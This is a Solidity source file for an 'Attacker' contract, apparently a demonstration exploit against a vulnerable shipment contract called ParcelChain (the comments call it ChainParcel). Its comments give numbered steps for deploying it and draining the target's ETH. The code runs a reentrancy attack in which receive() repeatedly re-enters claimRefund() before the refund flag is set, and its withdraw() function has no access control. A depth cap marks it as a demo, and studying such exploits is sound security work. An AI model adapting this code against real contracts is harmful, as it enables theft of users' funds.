// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./ParcelChain.sol";

/*   1. Deploy ChainParcel.
 *   2. Deploy this Attacker contract, passing the ChainParcel address.
 *   3. From the Attacker contract, call createMaliciousShipment() with
 *      some ETH (acts as the "sender") and a short deadline.
 *   4. Wait for the deadline to pass (or use a very near deadline).
 *   5. Call attack(shipmentId). The contract's receive() will keep
 *      re-entering claimRefund() and draining ETH from ChainParcel
 *      until the contract runs out of balance or the gas runs low.
 *   6. Check ChainParcel.contractBalance() before and after, and the
 *      Attacker contract's own ETH balance, to show the drain.
*/

contract Attacker {
    ParcelChain public target;
    uint256 public shipmentId;
    uint256 public attackCount;
    uint256 public constant MAX_REENTRANCE = 3; //safeguard for demonstration

    constructor (address payable targetAddress) {
        target = ParcelChain(targetAddress);
    }
    // Creates a shipment where this contract is the sender, so that
    // the refund (if the deadline passes without delivery) is paid
    // back to this contract, triggering receive().
    function createMaliciousShipment(address receiver, uint256 deadline) external payable returns (uint256) {
        shipmentId = target.createShipment{value: msg.value}(receiver, deadline);
        return shipmentId;
    }

    function attack(uint256 id) external {
        shipmentId = id;
        attackCount = 0;
        target.claimRefund(id);
    }

    // Re-enters claimRefund() each time this contract receives ETH,
    // because ChainParcel sends the refund BEFORE updating s.refunded.
    receive () external payable {
        if (attackCount < MAX_REENTRANCE && address(target).balance > 0) {
            attackCount++;
            target.claimRefund(shipmentId);
        }
    }

    function withdraw() external {
        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(success, "Failed to send Ether");
    } 

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}